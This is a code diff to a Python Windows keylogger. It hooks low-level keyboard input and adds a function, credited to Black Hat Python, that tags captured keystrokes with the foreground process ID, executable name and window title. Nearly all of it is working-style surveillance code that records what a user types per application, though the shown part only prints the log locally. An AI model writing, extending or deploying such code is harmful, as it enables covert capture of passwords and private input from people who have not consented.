@@ -24,6 +24,9 @@ kernel32 = windll.kernel32
 WH_KEYBOARD_LL=13
 WM_KEYDOWN=0x0100
 
+psapi = windll.psapi
+current_window = None
+
 keyCodes={
 	0x08 : "[BKSP]",
 	0x09 : "[TAB]",
@@ -112,11 +115,35 @@ class KeyLogger(threading.Thread):
 		self.keys_buffer+=hooked_key
 		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)	 
 
+#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
+def get_current_process():
+	hwnd = user32.GetForegroundWindow()
+	
+	pid = c_ulong(0)
+	user32.GetWindowThreadProcessId(hwnd, byref(pid))
+	
+	process_id = "%d" % pid.value
+	
+	executable = create_string_buffer("\x00" * 512)
+	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
+	
+	window_title = create_string_buffer("\x00" * 512)
+	length = user32.GetWindowTextA(hwnd, byref(window_title),512)
+	
+	kernel32.CloseHandle(hwnd)
+	kernel32.CloseHandle(h_process)
+	return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+
 if __name__=="__main__":
 	keyLogger = KeyLogger()
 	keyLogger.start()
 	while True:
-		time.sleep(5)
-		print keyLogger.dump()
-
-
+		if keyLogger.keys_buffer == "":
+			continue
+		else:
+			curr_proc = get_current_process()
+			if current_window != curr_proc:
+				print keyLogger.dump()
+				current_window = curr_proc
+				print current_window
